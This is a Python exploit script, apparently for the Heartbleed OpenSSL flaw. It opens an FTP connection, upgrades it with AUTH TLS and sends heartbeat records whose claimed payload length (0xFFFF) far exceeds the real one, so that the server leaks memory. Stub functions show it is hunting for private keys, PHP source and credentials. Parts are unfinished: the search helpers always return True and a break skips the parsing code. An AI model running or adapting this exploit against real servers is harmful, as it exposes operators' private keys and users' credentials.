#!/usr/bin/python3

import sys
import socket
import struct

from utils import *

host = sys.argv[1]
port = sys.argv[2]

def find_priv_key(data):
    return True
def find_php(data):
    return b"php" in data
def find_creds(data):
    return True
def recv_ftp_resp(s):
    resp = s.recv(2)
    while b"\r" not in resp[-2:]:
        resp += s.recv(2)
    if resp[-1] != "\n":
        resp += s.recv(1)
    return resp.decode().strip()

def recv_bytes(s, length):
    data = b''
    while len(data) < length:
        chunk = s.recv(length - len(data))
        assert chunk
        data += chunk
    return data

def recv_tls_resp(s):
    header = recv_bytes(s, 5)
    ctype,v,length = struct.unpack('>BHH', header)
    data = recv_bytes(s, length)
    return ctype,data

def parse_tls_handshake(resp):
    messages = []
    while resp:
        ctype = resp[0]
        length = int.from_bytes(resp[1:4], 'big')
        messages.append((ctype, length, resp[4:4+length]))
        resp = resp[4+length:]
    return messages

print("Connecting to {}:{}".format(host, port))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
sys.stdout.write("Banner: ")
print(recv_ftp_resp(s))

print("Sending AUTH TLS...")
s.send(b"AUTH TLS\n")
resp = recv_ftp_resp(s)
print(resp)
assert "234" in resp

print("Sending TLSv1.2 Client Hello...")
s.send(hello_record())
server_hello_done = False
while not server_hello_done:
    resp = recv_tls_resp(s)
    assert resp[0] == 0x16 # we expect only handshakes in responses
    for message in parse_tls_handshake(resp[1]):
        if message[0] == 0x0e: # server hello done
            server_hello_done = True

def recv_heartbeat_responses(s, leng):
    #0xFFFF + 21
    data = b""
    recvd_header = False
    while len(data) < leng:
        ctype,chunk = recv_tls_resp(s)
        assert ctype == 0x18 # heartbeat ssl record
        print(chunk[:5])
        print(chunk[-10:])
        if not recvd_header:
            assert chunk[0] == 0x02 # heartbeat type response
            assert chunk[1] == 0xFF # first byte of payload length
            assert chunk[2] == 0xFF # second byte of payload length
            chunk = chunk[3:]
            recvd_header = True
        print("Chunk length: {}".format(len(chunk)))
        data += chunk
    print("Data length: {}".format(len(data)))
    assert len(data) == leng
    print(leng)
    return data
    

found_key = False
found_php = False
found_creds = False
while not found_key or not found_php or not found_creds:
    print("Sending Heartbeat of SSL Record Length = 3, but Payload length = 0xFFFF...")
    import time
    time.sleep(1)
    s.send(get_heartbeat())
    # vulnerable openssl will return these 0xFFFF in a few responses, +20 was adjusted experimentally
    s.settimeout(1)
    resp = recv_heartbeat_responses(s, 0xFFFF)
    print("heartbeat received {} bytes".format(len(resp)))
    s.recv(1)
    break

    if not found_key:
        found_key = find_priv_key(resp[1])

    if not found_php:
        found_php = find_php(resp[1])

    if not found_creds:
        found_creds = find_creds(resp[1])

    print(''.join(chr(c) for c in resp[1] if c >= 0x20 and c <= 0x7E))

    import time
    time.sleep(1)

s.close()
